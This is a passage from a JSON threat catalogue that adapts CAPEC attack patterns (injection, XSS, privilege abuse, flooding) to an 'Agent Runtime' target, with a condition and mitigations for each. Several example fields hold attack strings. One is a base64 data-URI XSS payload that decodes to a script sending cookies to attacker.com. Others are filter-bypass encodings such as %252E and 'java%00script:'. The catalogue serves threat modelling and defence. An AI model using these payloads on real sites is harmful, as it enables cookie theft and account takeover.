relationships or assumptions regarding the generation of secret values. This attack differs from Authentication Bypass attacks in that Authentication Abuse allows the attacker to be certified as a valid user through illegitimate means, while Authentication Bypass allows the user to access protected material without ever being certified as an authenticated user. This attack does not rely on prior sessions established by successfully authenticating users, as relied upon for the Exploitation of Session Variables, Resource IDs and other Trusted Credentials attack patterns.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "140", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/114.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "AA01"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Double Encoding", "details": "The adversary utilizes a repeating of the encoding process for a set of characters (that is, character encoding a character encoding of a character) to obfuscate the payload of a particular request. This may allow the adversary to bypass filters that attempt to detect illegal characters or strings, such as those that might be used in traversal or injection attacks. Filters may be able to catch illegal encoded strings, but may not catch doubly encoded strings. For example, a dot (.), often used in path traversal attacks and therefore often blocked by filters, could be URL encoded as %2E. However, many filters recognize this encoding and would still block the request. In a double encoding, the % in the above URL encoding would be encoded again as %25, resulting in %252E which some filters might not catch, but which could still be interpreted as a dot (.) by interpreters on the target.", "example": "Double Enconding Attacks can often be used to bypass Cross Site Scripting (XSS) detection and execute XSS attacks. The use of double encouding prevents the filter from working as intended and allows the XSS to bypass dectection. This can allow an adversary to execute malicious code.", "id": "141", "mitigations": "Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input. Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. When client input is required from web-based forms, avoid using the GET method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the POST method whenever possible. Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.Refer to the RFCs to safely decode URL. Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive. There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).", "references": "https://capec.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/173.html, http://cwe.mitre.org/data/definitions/177.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "DE02"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "142", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.usesSecureFunctions is False", "cvss": "", "description": "Buffer Manipulation", "details": "An adversary manipulates an application's interaction with a buffer in an attempt to read or modify data they shouldn't have access to. Buffer attacks are distinguished in that it is the buffer space itself that is the target of the attack rather than any code responsible for interpreting the content of the buffer. In virtually all buffer attacks the content that is placed in the buffer is immaterial. Instead, most buffer attacks involve retrieving or providing more input than can be stored in the allocated buffer, resulting in the reading or overwriting of other unintended program memory.", "example": "Attacker identifies programmatic means for interacting with a buffer, such as vulnerable C code, and is able to provide input to this interaction.", "id": "143", "mitigations": "To help protect an application from buffer manipulation attacks, a number of potential mitigations can be leveraged. Before starting the development of the application, consider using a code language (e.g., Java) or compiler that limits the ability of developers to act beyond the bounds of a buffer. If the chosen language is susceptible to buffer related issues (e.g., C) then consider using secure functions instead of those vulnerable to buffer manipulations. If a potentially dangerous function must be used, make sure that proper boundary checking is performed. Additionally, there are often a number of compiler-based mechanisms (e.g., StackGuard, ProPolice and the Microsoft Visual Studio /GS flag) that can help identify and protect against potential buffer issues. Finally, there may be operating system level preventative functionality that can be applied.", "references": "https://capec.mitre.org/data/definitions/123.html, http://cwe.mitre.org/data/definitions/119.html", "response": "", "severity": "Very High", "target": "Agent Runtime", "threat_id": "INP07"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False or target.controls.isResilient is False", "cvss": "", "description": "Flooding", "details": "An adversary consumes the resources of a target by rapidly engaging in a large number of interactions with the target. This type of attack generally exposes a weakness in rate limiting or flow. When successful this attack prevents legitimate users from accessing the service and can cause the target to crash. This attack differs from resource depletion through leaks or allocations in that the latter attacks do not rely on the volume of requests made to the target but instead focus on manipulation of the target's operations. The key factor in a flooding attack is the number of requests the adversary can make in a given period of time. The greater this number, the more likely an attack is to succeed against a given target.", "example": "Adversary tries to bring a network or service down by flooding it with large amounts of traffic.", "id": "144", "mitigations": "Ensure that protocols have specific limits of scale configured. Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits. Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.", "references": "https://capec.mitre.org/data/definitions/125.html, http://cwe.mitre.org/data/definitions/404.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "DO01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "145", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Format String Injection", "details": "An adversary includes formatting characters in a string input field on the target application. Most applications assume that users will provide static text and may respond unpredictably to the presence of formatting character. For example, in certain functions of the C programming languages such as printf, the formatting character %s will print the contents of a memory location expecting this location to identify a string and the formatting character %n prints the number of DWORD written in the memory. An adversary can use this to read or write to memory locations or files, or simply to manipulate the value of the resulting text in unexpected ways. Reading or writing memory may result in program crashes and writing memory could result in the execution of arbitrary code if the adversary can write to the program stack.", "example": "Untrusted search path vulnerability in the add_filename_to_string function in intl/gettext/loadmsgcat.c for Elinks 0.11.1 allows local users to cause Elinks to use an untrusted gettext message catalog (.po file) in a ../po directory, which can be leveraged to conduct format string attacks.", "id": "146", "mitigations": "Limit the usage of formatting string functions. Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.", "references": "https://capec.mitre.org/data/definitions/135.html, http://cwe.mitre.org/data/definitions/134.html, http://cwe.mitre.org/data/definitions/133.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP08"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False and target.controls.validatesInput is False", "cvss": "", "description": "Client-side Injection-induced Buffer Overflow", "details": "This type of attack exploits a buffer overflow vulnerability in targeted client software through injection of malicious content from a custom-built hostile service.", "example": "Attack Example: Buffer Overflow in Internet Explorer 4.0 Via EMBED Tag Authors often use EMBED tags in HTML documents. For example <EMBED TYPE=audio/midi SRC=/path/file.mid AUTOSTART=true If an attacker supplies an overly long path in the SRC= directive, the mshtml.dll component will suffer a buffer overflow. This is a standard example of content in a Web page being directed to exploit a faulty module in the system. There are potentially thousands of different ways data can propagate into a given system, thus these kinds of attacks will continue to be found in the wild.", "id": "147", "mitigations": "The client software should not install untrusted code from a non-authenticated server. The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers. Perform input validation for length of buffer inputs. Use a language or compiler that performs automatic bounds checking. Use an abstraction library to abstract away risky APIs. Not a complete solution. Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution. Ensure all buffer uses are consistently bounds-checked. Use OS-level preventative functionality. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/14.html, http://cwe.mitre.org/data/definitions/74.html, http://cwe.mitre.org/data/definitions/353.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP12"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Command Delimiters", "details": "An attack of this type exploits a programs' vulnerabilities that allows an attacker's commands to be concatenated onto a legitimate command with the intent of targeting other resources such as the file system or database. The system that uses a filter or a blacklist input validation, as opposed to whitelist validation is vulnerable to an attacker who predicts delimiters (or combinations of delimiters) not present in the filter or blacklist. As with other injection attacks, the attacker uses the command delimiter payload as an entry point to tunnel through the application and activate additional attacks through SQL queries, shell commands, network scanning, and so on.", "example": "By appending special characters, such as a semicolon or other commands that are executed by the target process, the attacker is able to execute a wide variety of malicious commands in the target process space, utilizing the target's inherited permissions, against any resource the host has access to. The possibilities are vast including injection attacks against RDBMS (SQL Injection), directory servers (LDAP Injection), XML documents (XPath and XQuery Injection), and command line shells. In many injection attacks, the results are converted back to strings and displayed to the client process such as a web browser without tripping any security alarms, so the network firewall does not log any out of the ordinary behavior. LDAP servers house critical identity assets such as user, profile, password, and group information that is used to authenticate and authorize users. An attacker that can query the directory at will and execute custom commands against the directory server is literally working with the keys to the kingdom in many enterprises. When user, organizational units, and other directory objects are queried by building the query string directly from user input with no validation, or other conversion, then the attacker has the ability to use any LDAP commands to query, filter, list, and crawl against the LDAP server directly in the same manner as SQL injection gives the ability to the attacker to run SQL commands on the database.", "id": "148", "mitigations": "Design: Perform whitelist validation against a positive specification for command length, type, and parameters.Design: Limit program privileges, so if commands circumvent program input validation or filter routines then commands do not running under a privileged accountImplementation: Perform input validation for all remote content.Implementation: Use type conversions such as JDBC prepared statements.", "references": "https://capec.mitre.org/data/definitions/15.html, http://cwe.mitre.org/data/definitions/146.html, http://cwe.mitre.org/data/definitions/77.html, http://cwe.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/154.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP13"}, {"assumption": null, "condition": "target.controls.validatesInput is False", "cvss": "", "description": "Input Data Manipulation", "details": "An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can adversely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.", "example": "A target application has an integer variable for which only some integer values are expected by the application. But since it does not have any checks in place to validate the value of the input, the attacker is able to manipulate the targeted integer variable such that normal operations result in non-standard values.", "id": "149", "mitigations": "Validation of user input for type, length, data-range, format, etc.", "references": "https://capec.mitre.org/data/definitions/153.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "INP14"}, {"assumption": null, "condition": "target.controls.implementsAuthenticationScheme is False", "cvss": "", "description": "Dictionary-based Password Attack", "details": "An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.", "example": "A system user selects the word treacherous as their passwords believing that it would be very difficult to guess. The password-based dictionary attack is used to crack this password and gain access to the account.The Cisco LEAP challenge/response authentication mechanism uses passwords in a way that is susceptible to dictionary attacks, which makes it easier for remote attackers to gain privileges via brute force password guessing attacks. Cisco LEAP is a mutual authentication algorithm that supports dynamic derivation of session keys. With Cisco LEAP, mutual authentication relies on a shared secret, the user's logon password (which is known by the client and the network), and is used to respond to challenges between the user and the Remote Authentication Dial-In User Service (RADIUS) server. Methods exist for someone to write a tool to launch an offline dictionary attack on password-based authentications that leverage Microsoft MS-CHAP, such as Cisco LEAP. The tool leverages large password lists to efficiently launch offline dictionary attacks against LEAP user accounts, collected through passive sniffing or active techniques.See also: CVE-2003-1096", "id": "150", "mitigations": "Create a strong password policy and ensure that your system enforces this policy.Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-02.", "references": "https://capec.mitre.org/data/definitions/16.html, http://cwe.mitre.org/data/definitions/521.html, http://cwe.mitre.org/data/definitions/262.html, http://cwe.mitre.org/data/definitions/263.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "CR03"}, {"assumption": null, "condition": "target.controls.authenticatesSource is False", "cvss": "", "description": "Principal Spoof", "details": "A Principal Spoof is a form of Identity Spoofing where an adversary pretends to be some other person in an interaction. This is often accomplished by crafting a message (either written, verbal, or visual) that appears to come from a person other than the adversary. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. A Principal Spoof does not use stolen or spoofed authentication credentials, instead relying on the appearance and content of the message to reflect identity. The possible outcomes of a Principal Spoof mirror those of Identity Spoofing. (e.g., escalation of privilege and false attribution of data or activities) Likewise, most techniques for Identity Spoofing (crafting messages or intercepting and replaying or modifying messages) can be used for a Principal Spoof attack. However, because a Principal Spoof is used to impersonate a person, social engineering can be both an attack technique (using social techniques to generate evidence in support of a false identity) as well as a possible outcome (manipulating people's perceptions by making statements or performing actions under a target's name).", "example": "An adversary may craft messages that appear to come from a different principle or use stolen / spoofed authentication credentials.", "id": "151", "mitigations": "Employ robust authentication processes (e.g., multi-factor authentication).", "references": "https://capec.mitre.org/data/definitions/195.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "AA02"}, {"assumption": null, "condition": "target.controls.disablesiFrames is False", "cvss": "", "description": "iFrame Overlay", "details": "In an iFrame overlay attack the victim is tricked into unknowingly initiating some action in one system while interacting with the UI from seemingly completely different system. While being logged in to some target system, the victim visits the attackers' malicious site which displays a UI that the victim wishes to interact with. In reality, the iFrame overlay page has a transparent layer above the visible UI with action controls that the attacker wishes the victim to execute. The victim clicks on buttons or other UI elements they see on the page which actually triggers the action controls in the transparent overlaying layer. Depending on what that action control is, the attacker may have just tricked the victim into executing some potentially privileged (and most undesired) functionality in the target system to which the victim is authenticated. The basic problem here is that there is a dichotomy between what the victim thinks he or she is clicking on versus what he or she is actually clicking on.", "example": "The following example is a real-world iFrame overlay attack [2]. In this attack, the malicious page embeds Twitter.com on a transparent IFRAME. The status-message field is initialized with the URL of the malicious page itself. To provoke the click, which is necessary to publish the entry, the malicious page displays a button labeled Don't Click. This button is aligned with the invisible Update button of Twitter. Once the user performs the click, the status message (i.e., a link to the malicious page itself) is posted to his/ her Twitter profile.", "id": "152", "mitigations": "Configuration: Disable iFrames in the Web browser.Operation: When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.Operation: If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.", "references": "https://capec.mitre.org/data/definitions/222.html, http://cwe.mitre.org/data/definitions/1021.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP20"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False and (target.controls.sanitizesInput is False or target.controls.validatesInput is False)", "cvss": "", "description": "File Content Injection", "details": "An attack of this type exploits the host's trust in executing remote content, including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the adversary and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The adversary exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the adversary knows the standard handling routines and can identify vulnerabilities and entry points, they can be exploited by otherwise seemingly normal content. Once the attack is executed, the adversary's program can access relative directories such as C:Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.", "example": "PHP is a very popular language used for developing web applications. When PHP is used with global variables, a vulnerability may be opened that affects the file system. A standard HTML form that allows for remote users to upload files, may also place those files in a public directory where the adversary can directly access and execute them through a browser. This vulnerability allows remote adversaries to execute arbitrary code on the system, and can result in the adversary being able to erase intrusion evidence from system and application logs. [R.23.2]", "id": "153", "mitigations": "Design: Enforce principle of least privilegeDesign: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)Design: Execute programs with constrained privileges, so parent process does not open up further vulnerabilities. Ensure that all directories, temporary directories and files, and memory are executing with limited privileges to protect against remote execution.Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.Implementation: Virus scanning on hostImplementation: Host integrity monitoring for critical files, directories, and processes. The goal of host integrity monitoring is to be aware when a security issue has occurred so that incident response and other forensic activities can begin.", "references": "https://capec.mitre.org/data/definitions/23.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "Very High", "target": "Agent Runtime", "threat_id": "INP23"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Privilege Escalation", "details": "An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "154", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/233.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "AC12"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Hijacking a privileged process", "details": "An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.", "example": "The software does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor. As a result, the program is indefinitely operating in a raised privilege state, possibly allowing further exploitation to occur.", "id": "155", "mitigations": "Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software. Follow the principle of least privilege when assigning access rights to entities in a software system. Implement separation of privilege - Require multiple conditions to be met before permitting access to a system resource.", "references": "https://capec.mitre.org/data/definitions/234.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/648.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "AC13"}, {"assumption": null, "condition": "target.controls.implementsPOLP is False and (target.usesEnvironmentVariables is True or target.controls.validatesInput is False)", "cvss": "", "description": "Catching exception throw/signal from privileged block", "details": "Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means. Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.", "example": "Attacker targets an application written using Java's AWT, with the 1.2.2 era event model. In this circumstance, any AWTEvent originating in the underlying OS (such as a mouse click) would return a privileged thread. The Attacker could choose to not return the AWT-generated thread upon consuming the event, but instead leveraging its privilege to conduct privileged operations.", "id": "156", "mitigations": "Application Architects must be careful to design callback, signal, and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.", "references": "https://capec.mitre.org/data/definitions/236.html, http://cwe.mitre.org/data/definitions/270.html", "response": "", "severity": "Very High", "target": "Agent Runtime", "threat_id": "AC14"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False or target.controls.validatesInput is False", "cvss": "", "description": "Filter Failure through Buffer Overflow", "details": "In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).", "example": "Attack Example: Filter Failure in Taylor UUCP Daemon Sending in arguments that are too long to cause the filter to fail open is one instantiation of the filter failure attack. The Taylor UUCP daemon is designed to remove hostile arguments before they can be executed. If the arguments are too long, however, the daemon fails to remove them. This leaves the door open for attack.A filter is used by a web application to filter out characters that may allow the input to jump from the data plane to the control plane when data is used in a SQL statement (chaining this attack with the SQL injection attack). Leveraging a buffer overflow the attacker makes the filter fail insecurely and the tainted data is permitted to enter unfiltered into the system, subsequently causing a SQL injection.Audit Truncation and Filters with Buffer Overflow. Sometimes very large transactions can be used to destroy a log file or cause partial logging failures. In this kind of attack, log processing code might be examining a transaction in real-time processing, but the oversized transaction causes a logic branch or an exception of some kind that is trapped. In other words, the transaction is still executed, but the logging or filtering mechanism still fails. This has two consequences, the first being that you can run transactions that are not logged in any way (or perhaps the log entry is completely corrupted). The second consequence is that you might slip through an active filter that otherwise would stop your attack.", "id": "157", "mitigations": "Make sure that ANY failure occurring in the filtering or input validation routine is properly handled and that offending input is NOT allowed to go through. Basically make sure that the vault is closed when failure occurs.Pre-design: Use a language or compiler that performs automatic bounds checking.Pre-design through Build: Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.Operational: Use OS-level preventative functionality. Not a complete solution.Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.", "references": "https://capec.mitre.org/data/definitions/24.html, http://cwe.mitre.org/data/definitions/120.html, http://cwe.mitre.org/data/definitions/680.html, http://cwe.mitre.org/data/definitions/20.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP24"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Resource Injection", "details": "An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.", "example": "A Java code uses input from an HTTP request to create a file name. The programmer has not considered the possibility that an attacker could provide a file name such as '../../tomcat/confserver.xml', which causes the application to delete one of its own configuration files.", "id": "158", "mitigations": "Ensure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/240.html, https://capec.mitre.org/data/definitions/240.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP25"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "Code Injection", "details": "An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.", "example": "When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.", "id": "159", "mitigations": "Utilize strict type, character, and encoding enforcementEnsure all input content that is delivered to client is sanitized against an acceptable content specification.Perform input validation for all content.Enforce regular patching of software.", "references": "https://capec.mitre.org/data/definitions/242.html, http://cwe.mitre.org/data/definitions/94.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP26"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Targeting HTML Attributes", "details": "An adversary inserts commands to perform cross-site scripting (XSS) actions in HTML attributes. Many filters do not adequately sanitize attributes against the presence of potentially dangerous commands even if they adequately sanitize tags. For example, dangerous expressions could be inserted into a style attribute in an anchor tag, resulting in the execution of malicious code when the resulting page is rendered. If a victim is tricked into viewing the rendered page the attack proceeds like a normal XSS attack, possibly resulting in the loss of sensitive cookies or other malicious activities.", "example": "Application allows execution of any Javascript they want on the browser which enables the adversary to steal session tokens and perform malicious activities.", "id": "160", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list all input including that which is not expected to have any scripting content.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/243.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "INP27"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting URI Placeholders", "details": "An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.", "example": "The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.", "id": "161", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html", "response": "", "severity": "High", "target": "Agent Runtime", "threat_id": "INP28"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Doubled Characters", "details": "The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "example": "By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "id": "162", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/245.html", "response": "", "severity": "Medium", "target": "Agent Runtime", "threat_id": "INP29"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False", "cvss": "", "description": "XSS Using Invalid Characters", "details": "An adversary inserts invalid characters in identifiers to bypass application filtering of input. Filters may not scan beyond invalid characters but during later stages of processing content that follows these invalid characters may still be processed. This allows the attacker to sneak prohibited commands past filters and perform normally prohibited operations. Invalid characters may include null, carriage return, line feed or tab in an identifier. Successful bypassing of the filter can result in a XSS attack, resulting in the disclosure of web cookies or possibly other results.", "example": "The software may attempt to remove a 'javascript:' URI scheme, but a 'java%00script:' URI may bypass this check and still be rendered as active javascript by some browsers, allowing XSS or other attacks.", "id": "163", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and white list any input that will be included in any subsequent web pages or back end 